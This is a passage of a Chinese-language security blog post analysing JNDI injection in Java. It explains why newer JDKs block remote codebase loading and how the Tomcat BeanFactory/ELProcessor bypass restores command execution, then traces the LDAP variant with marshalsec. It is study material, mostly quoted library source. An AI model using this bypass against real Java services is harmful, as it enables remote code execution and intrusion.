src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027009.png" alt="image-20230226192035548"> </p><p>启动客户端</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192027472.png" alt="image-20230226192046711"> </p><h3 id="高版本JDK运行"><a href="#高版本JDK运行" class="headerlink" title="高版本JDK运行"></a>高版本JDK运行</h3><p><code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code>，运行时需加入参数 <code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</code> 。因为如果 <code>JDK</code> 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 <code>RMI</code> 代码。<br>不加参数，抛出异常：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192034081.png" alt="image-20230226193613482"> </p><p>版本8u351</p><p>经过我的一番苦苦调试（终于tm学会调试了），发现问题出在这里</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192028480.png" alt="image-20230228212541157"> </p><p>加入参数后即可正常运行</p><h4 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h4><p>其中 <code>getFactoryClassLocation()</code>方法是获取<code>classFactoryLocation</code>地址，可以看到，在 <code>ref != null &amp;&amp; ref.getFactoryClassLocation() != null</code> 的情况下，会对 <code>trustURLCodebase</code> 进行取反，由于在 <code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 版本及以后， <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认为 <code>false</code> ，所以会进入 <code>if</code> 语句，抛出异常。</p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>如果要解码的对象 <code>r</code> 是远程引用，就需要先解引用然后再调用 <code>NamingManager.getObjectInstance</code>，其中会实例化对应的 <code>ObjectFactory</code> 类并调用其 <code>getObjectInstance</code> 方法，这也符合我们前面打印的 <code>EvilClass</code> 的执行顺序。</p><p>因此为了绕过这里 <code>ConfigurationException</code> 的限制，我们有三种方法: 令 <code>ref</code> 为空，或者 令 <code>ref.getFactoryClassLocation()</code> 为空，或者 * 令 <code>trustURLCodebase</code> 为 <code>true</code></p><p>方法一，令var8为空，语义上看需要 <code>obj</code> 既不是 <code>Reference</code> 也不是 <code>Referenceable</code>。即，不能是对象引用，只能是原始对象，这时候客户端直接实例化本地对象，远程 <code>RMI</code> 没有操作的空间，因此这种情况不太好利用；</p><p>方法二：令 <code>ref.getFactoryClassLocation()</code> 返回空。即，让 <code>ref</code> 对象的 <code>classFactoryLocation</code> 属性为空，这个属性表示引用所指向对象的对应 <code>factory</code> 名称，对于远程代码加载而言是 <code>codebase</code>，即远程代码的 <code>URL</code> 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 <code>factory</code> 是本地代码，则该值为空，这是绕过高版本 <code>JDK</code> 限制的关键；</p><p>方法三：我们已经在上节用过，即在命令行指定 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 参数。</p><p>那就去看看<code>getFactoryClassLocation()</code>方法，以及返回值的赋值情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> classFactoryLocation;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Reference</span><span class="hljs-params">(String className, String factory, String factoryLocation)</span> &#123;<br>    <span class="hljs-built_in">this</span>(className);<br>    classFactory = factory;<br>    classFactoryLocation = factoryLocation;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Reference</span><span class="hljs-params">(String className, RefAddr addr,</span><br><span class="hljs-params">                 String factory, String factoryLocation)</span> &#123;<br>    <span class="hljs-built_in">this</span>(className, addr);<br>    classFactory = factory;<br>    classFactoryLocation = factoryLocation;<br>&#125;<br></code></pre></td></tr></table></figure><p>要满足方法二情况，即让<code>ref.getFactoryClassLocation()</code> 返回空，我们只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code>。</p><p>它是负责根据 Reference 对象创建相应的 <code>ObjectFactory</code> 对象，并调用其 <code>getObjectInstance()</code> 方法来生成目标对象的类。</p><p>接着看一下 <code>javax.naming.spi.NamingManager</code> 的解析过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object<br>    <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object refInfo, Name name, Context nameCtx,</span><br><span class="hljs-params">                      Hashtable&lt;?,?&gt; environment)</span><br>    <span class="hljs-keyword">throws</span> Exception<br>&#123;<br><br>    ObjectFactory factory;<br><br>    <span class="hljs-comment">// Use builder if installed</span><br>    <span class="hljs-type">ObjectFactoryBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> getObjectFactoryBuilder();<br>    <span class="hljs-keyword">if</span> (builder != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// builder must return non-null factory</span><br>        factory = builder.createObjectFactory(refInfo, environment);<br>        <span class="hljs-keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,<br>            environment);<br>    &#125;<br><br>    <span class="hljs-comment">// Use reference if possible</span><br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Reference) &#123;<br>        ref = (Reference) refInfo;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Referenceable) &#123;<br>        ref = ((Referenceable)(refInfo)).getReference();<br>    &#125;<br><br>    Object answer;<br><br>    <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ref.getFactoryClassName();<br>        <span class="hljs-keyword">if</span> (f != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// if reference identifies a factory, use exclusively</span><br><br>            factory = getObjectFactoryFromReference(ref, f);<br>            <span class="hljs-keyword">if</span> (factory != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,<br>                                                 environment);<br>            &#125;<br>            <span class="hljs-comment">// No factory found, so return original refInfo.</span><br>            <span class="hljs-comment">// Will reach this point if factory class is not in</span><br>            <span class="hljs-comment">// class path and reference does not contain a URL for it</span><br>            <span class="hljs-keyword">return</span> refInfo;<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// if reference has no factory, check for addresses</span><br>            <span class="hljs-comment">// containing URLs</span><br><br>            answer = processURLAddrs(ref, name, nameCtx, environment);<br>            <span class="hljs-keyword">if</span> (answer != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> answer;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// try using any specified factories</span><br>    answer =<br>        createObjectFromFactories(refInfo, name, nameCtx, environment);<br>    <span class="hljs-keyword">return</span> (answer != <span class="hljs-literal">null</span>) ? answer : refInfo;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，在处理 <code>Reference</code> 对象时，会先调用 <code>ref.getFactoryClassName()</code> 获取对应工厂类的名称，也就是会先从本地的<code>CLASSPATH</code>中寻找该类。如果不为空则直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果为空则通过网络去请求，即前文中的情况。</p><p>之后会执行静态代码块、代码块、无参构造函数和<code>getObjectInstance</code>方法。那么只需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在这四个地方其中一块能执行<code>payload</code>就可以了。但<code>getObjectInstance</code>方法需要你的类实现<code>javax.naming.spi.ObjectFactory</code>接口<br>因此，我们实际上可以指定一个存在于目标 <code>classpath</code> 中的工厂类名称，交由这个工厂类去实例化实际的目标类(即引用所指向的类)，从而间接实现一定的代码控制。<br>整个利用过程的主要调用栈如下：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs leaf">InitialContext<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">lookup</span><span class="hljs-params">()</span></span><br>  RegistryContext<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">lookup</span><span class="hljs-params">()</span></span><br>    RegistryContext<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">decodeObject</span><span class="hljs-params">()</span></span><br>      NamingManager<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getObjectInstance</span><span class="hljs-params">()</span></span><br>          objectfactory = NamingManager<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getObjectFactoryFromReference</span><span class="hljs-params">()</span></span><br>                  Class<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newInstance</span><span class="hljs-params">()</span></span>  //--&gt;恶意代码被执行<br>     或:   objectfactory<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getObjectInstance</span><span class="hljs-params">()</span></span>  //--&gt;恶意代码被执行<br></code></pre></td></tr></table></figure><p>总结一下<br>满足要求的工厂类条件： 存在于目标本地的 <code>CLASSPATH</code> 中实现 <code>javax.naming.spi.ObjectFactory</code> 接口 至少存在一个 <code>getObjectInstance()</code> 方法</p><p>而存在于 <code>Tomcat</code> 依赖包中的 <code>org.apache.naming.factory.BeanFactory</code> 就是个不错的选择<br><code>org.apache.naming.factory.BeanFactory</code> ，这个类在 <code>Tomcat</code> 中，很多 <code>web</code> 应用都会包含，它的关键代码：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs sqf">public <span class="hljs-built_in">Object</span> getObjectInstance(<span class="hljs-built_in">Object</span> obj, <span class="hljs-built_in">Name</span> <span class="hljs-built_in">name</span>, Context nameCtx,<br>                                Hashtable&lt;?,?&gt; environment)<br>    throws NamingException &#123;<br><br>    Reference ref = (Reference) obj;<br>    String beanClassName = ref.getClassName();<br>    ClassLoader tcl = Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-comment">// 1. 反射获取类对象</span><br>    <span class="hljs-keyword">if</span> (tcl != null) &#123;<br>        beanClass = tcl.loadClass(beanClassName);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        beanClass = Class.forName(beanClassName);<br>    &#125;<br>    <span class="hljs-comment">// 2. 初始化类实例</span><br>    <span class="hljs-built_in">Object</span> bean = beanClass.getConstructor().newInstance();<br><br>    <span class="hljs-comment">// 3. 根据 Reference 的属性查找 setter 方法的别名</span><br>    RefAddr ra = ref.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;forceString&quot;</span>);<br>    String value = (String)ra.getContent();<br><br>    <span class="hljs-comment">// 4. 循环解析别名并保存到字典中</span><br>    <span class="hljs-keyword">for</span> (String <span class="hljs-built_in">param</span>: value.split(<span class="hljs-string">&quot;,&quot;</span>)) &#123;<br>        <span class="hljs-built_in">param</span> = <span class="hljs-built_in">param</span>.<span class="hljs-built_in">trim</span>();<br>        index = <span class="hljs-built_in">param</span>.indexOf(<span class="hljs-string">&#x27;=&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span>) &#123;<br>            setterName = <span class="hljs-built_in">param</span>.substring(index + <span class="hljs-number">1</span>).<span class="hljs-built_in">trim</span>();<br>            <span class="hljs-built_in">param</span> = <span class="hljs-built_in">param</span>.substring(<span class="hljs-number">0</span>, index).<span class="hljs-built_in">trim</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setterName = <span class="hljs-string">&quot;set&quot;</span> +<br>                <span class="hljs-built_in">param</span>.substring(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>).toUpperCase(Locale.ENGLISH) +<br>                <span class="hljs-built_in">param</span>.substring(<span class="hljs-number">1</span>);<br>        &#125;<br>        forced.put(<span class="hljs-built_in">param</span>, beanClass.getMethod(setterName, paramTypes));<br>    &#125;<br><br>    <span class="hljs-comment">// 5. 解析所有属性，并根据别名去调用 setter 方法</span><br>    Enumeration&lt;RefAddr&gt; e = ref.getAll();<br>    <span class="hljs-keyword">while</span> (e.hasMoreElements()) &#123;<br>        ra = e.nextElement();<br>        String propName = ra.getType();<br>        String value = (String)ra.getContent();<br>        <span class="hljs-built_in">Object</span>[] valueArray = new <span class="hljs-built_in">Object</span>[<span class="hljs-number">1</span>];<br>        Method method = forced.<span class="hljs-built_in">get</span>(propName);<br>        <span class="hljs-keyword">if</span> (method != null) &#123;<br>            valueArray[<span class="hljs-number">0</span>] = value;<br>            method.invoke(bean, valueArray);<br>        &#125;<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面注释标注了关键的部分，我们可以通过在返回给客户端的 <code>Reference</code> 对象的 <code>forceString</code> 字段指定 <code>setter</code> 方法的别名，并在后续初始化过程中进行调用。<br><code>forceString</code> 的格式为 <code>a=foo,bar</code>，以逗号分隔每个需要设置的属性，如果包含等号，则对应的 <code>setter</code> 方法为等号后的值 <code>foo</code>，如果不包含等号，则 <code>setter</code> 方法为默认值 <code>setBar</code>。<br>在后续调用时，调用 <code>setter</code> 方法使用单个参数，且参数值为对应属性对象 <code>RefAddr</code> 的值 (<code>getContent</code>)。因此，实际上我们可以调用任意指定类的任意方法，并指定单个可控的参数。</p><p>因为使用 <code>newInstance</code>创建实例（也就是后面<code>Poc</code>中的<code>ELProcessor</code>），所以只能调用无参构造，这就要求目标 <code>class</code> 得有无参构造方法，上面 <code>forceString</code> 可以给属性强制指定一个 <code>setter</code> 方法，参数为一个 <code>String</code> 类型<br>于是找到 <code>javax.el.ELProcessor</code> 作为目标 <code>class</code>，利用 <code>el</code> 表达式执行命令，工具 <a href="https://github.com/welk1n/JNDI-Injection-Bypass">JNDI-Injection-Bypass</a> 中的 <code>EvilRMIServer.java</code> 部分代码如下</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192031866.png" alt="zongjie3.png"> </p><p>所以整个绕过流程就是：<br>为了绕过<code>ConfigurationException</code>，需要满足<code>ref.getFactoryClassLocation()</code> 为空，只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code></p><p>之后去分析<code>Reference</code>的调用过程，来到<code>NamingManager</code>，需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在其中一块代码能执行<code>payload</code>，找到了<code>BeanFactory</code><br><code>BeanFactor</code>使用<code>newInstance</code>创建实例，所以只能调用无参构造，这就要求目标 <code>class</code> 得有无参构造方法且有办法执行相关命令，于是找到<code>ELProcessor</code>和<code>GroovyShell</code><br>总结起来就是绕过了<code>ConfigurationException</code>，进入<code>NamingManager</code>，使用<code>BeanFactor</code>创建<code>ELProcessor</code>&#x2F;<code>GroovyShell</code>无参实例，然后<code>BeanFactor</code>根据别名去调用方法（执行<code>ELProcessor</code>中的<code>eval</code>方法）</p><p>从代码中能看出该工具还有另一个利用方法，<code>groovy.lang.GroovyShell</code>，原理也是类似的</p><p>传入的 <code>Reference</code>为 <code>ResourceRef</code> 类，后面通过反射的方式实例化 <code>Reference</code> 所指向的任意 <code>Bean Class</code>，调用 <code>setter</code> 方法为所有的属性赋值，该 <code>Bean Class</code> 的类名、属性、属性值，全都来自于 <code>Reference</code> 对象。<code>ResourceRef</code>构造器的第七个参数<code>factoryLocation</code>是远程加载<code>factory</code>的地址，比如是一个<code>url</code>,这里将其设置为<code>null</code>,达到绕过<code>ConfigurationException</code>限制。</p><h2 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI_LDAP"></a>JNDI_LDAP</h2><h3 id="低版本JDK运行-1"><a href="#低版本JDK运行-1" class="headerlink" title="低版本JDK运行"></a>低版本JDK运行</h3><p>这里使用marshalsec来启动ldap服务端</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">mvn clean <span class="hljs-keyword">package</span> <span class="hljs-title">-DskipTests</span><br></code></pre></td></tr></table></figure><p>编译生成可执行jar包</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192031505.png" alt="image-20230309202850493">启动服务端</p><p>客户端代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/foo&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ret&quot;</span>+lookup);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>使用jdk8u65时</p><p><img src="D:/mdimage/image-20230309203535976.png" alt="image-20230309203535976"> </p><p><code>JNDI</code>发起<code>ldap</code>的<code>lookup</code>后，将有如下的调用流程，这里我们直接来关注，获得远程<code>LDAP Server</code>的<code>Entry</code>之后，<code>Client</code>这边是怎么做处理的</p><p><img src="D:/mdimage/image-20230309211408157.png" alt="image-20230309211408157"> </p><p><code>LADP</code>服务利用流程分析，<code>LADP</code>服务前面的调用流程和<code>jndi</code>是基本一样，从<code>Obj</code>类的<code>decodeObject</code>方法这里就有些不太一样了，<code>decodeObject</code>方法内部调用了<code>decodeReference</code>方法<br>跟进<code>com.sun.jndi.ldap.Obj.java#decodeObject</code>，按照该函数的注释来看，其主要功能是解码从<code>LDAP Server</code>来的对象，该对象可能是序列化的对象，也可能是一个<code>Reference</code>对象。关于序列化对象的处理，我们看后面一节。这里摘取了<code>Reference</code>的处理方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> Object <span class="hljs-title function_">decodeObject</span><span class="hljs-params">(Attributes var0)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>    String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">4</span>]));<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Attribute var1;<br>        <span class="hljs-keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">1</span>])) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> helper.getURLClassLoader(var2);<br>            <span class="hljs-keyword">return</span> deserializeObject((<span class="hljs-type">byte</span>[])((<span class="hljs-type">byte</span>[])var1.get()), var3);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">7</span>])) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">2</span>]).get(), (String)var1.get(), var2);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            var1 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">0</span>]);<br>            <span class="hljs-type">return</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span>= <span class="hljs-literal">null</span> || !var1.contains(JAVA_OBJECT_CLASSES[<span class="hljs-number">2</span>]) &amp;&amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[<span class="hljs-number">2</span>]) ? <span class="hljs-literal">null</span> : decodeReference(var0, var2);<br>            <span class="hljs-comment">//此处调用的decodeReference方法</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (IOException var5) &#123;<br>        <span class="hljs-type">NamingException</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NamingException</span>();<br>        var4.setRootCause(var5);<br>        <span class="hljs-keyword">throw</span> var4;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Obj</code>类的<code>decodeReference</code>方法根据<code>Ldap</code>传入的<code>addAttribute</code>属性构造并返回了一个新的<code>reference</code>对象引用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">decodeReference</span><span class="hljs-params">(Attributes var0, String[] var1)</span> <span class="hljs-keyword">throws</span> NamingException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Attribute var2;<br>        <span class="hljs-keyword">if</span> ((var2 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">2</span>])) == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidAttributesException</span>(JAVA_ATTRIBUTES[<span class="hljs-number">2</span>] + <span class="hljs-string">&quot; attribute is required&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> (String)var2.get();<br>            <span class="hljs-keyword">if</span> ((var2 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">3</span>])) != <span class="hljs-literal">null</span>) &#123;<br>                var4 = (String)var2.get();<br>            &#125;<br>            <span class="hljs-comment">//返回一个新的Reference对象引用</span><br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(var3, var4, var1 != <span class="hljs-literal">null</span> ? var1[<span class="hljs-number">0</span>] : <span class="hljs-literal">null</span>);<br>            <span class="hljs-comment">//获取第6个属性</span><br>            <span class="hljs-keyword">if</span> ((var2 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">5</span>])) != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">//省略部分代码</span><br>            &#125;<br>            <span class="hljs-comment">//直接返回reference对象</span><br>            <span class="hljs-keyword">return</span> var5;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LADP</code>服务的<code>Reference</code>对象引用的获取和<code>jndi</code>注入中的不太一样，<code>jndi</code>是通过<code>ReferenceWrapper_Stub</code>对象的<code>getReference</code>方法获取<code>reference</code>对象，而<code>LADP</code>服务是根据传入的属性构造一个新的<code>reference</code>对象引用，接着获取了第6个属性并判断是否为空，如果第6个属性为<code>null</code>则直接返回新的<code>reference</code>对象引用。</p><p>在new一个Reference时，三个属性如下</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192036922.png" alt="image-20230309212054690"> </p><p>接着会返回到<code>decodeObject</code>方法调用处，然后再返回到<code>LdapCtx</code>类的<code>c_lookup</code>方法调用处，接着往下执行调用<code>getObjectInstance</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object refInfo, Name name, Context nameCtx , Hashtable&lt;?,?&gt; environment, Attributes attrs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>           ObjectFactory factory;<br>           <span class="hljs-comment">//获取对象工厂</span><br>           <span class="hljs-type">ObjectFactoryBuilder</span> <span class="hljs-variable">builder</span> 